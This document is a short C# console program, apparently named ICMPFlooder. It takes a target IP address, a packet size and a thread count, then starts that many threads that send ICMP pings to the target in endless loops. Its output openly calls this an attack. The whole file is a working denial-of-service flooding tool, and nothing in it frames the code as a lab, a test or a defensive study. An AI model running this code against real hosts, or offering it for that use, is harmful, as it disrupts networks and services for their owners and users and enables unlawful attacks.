using System.Net;
using System.Net.NetworkInformation;

public class Program
{
    public static void Main(string[] args)
    {
        try
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Invalid parameters specified\r\n" +
                    "\"dotnet ICMPFlooder.dll <ip> <size> <threads>\"");
                return;
            }

            string ip = args[0];
            uint size = uint.Parse(args[1]), threads = uint.Parse(args[2]);

            try
            {
                IPAddress.Parse(ip);
            }
            catch
            {
                Console.WriteLine("Invalid IP Address specified.");
                return;
            }

            if (size > 65500)
            {
                Console.WriteLine("Invalid size specified.");
                return;
            }

            byte[] buffer = new byte[size];

            for (int i = 0; i < size; i++)
            {
                buffer[i] = 0x20;
            }

            for (int i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            new Ping().Send(ip, 10000, buffer);
                        }
                        catch
                        {

                        }
                    }
                }).Start();
            }

            Console.WriteLine($"Succesfully started your attack at {ip} with size {size} and threads {threads}. Press CTRL + C to stop the attack.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occured while executing the program.\r\n" +
                           ex.Message + "\r\n" + ex.StackTrace + "\r\n" + ex.Source);
        }
    }
}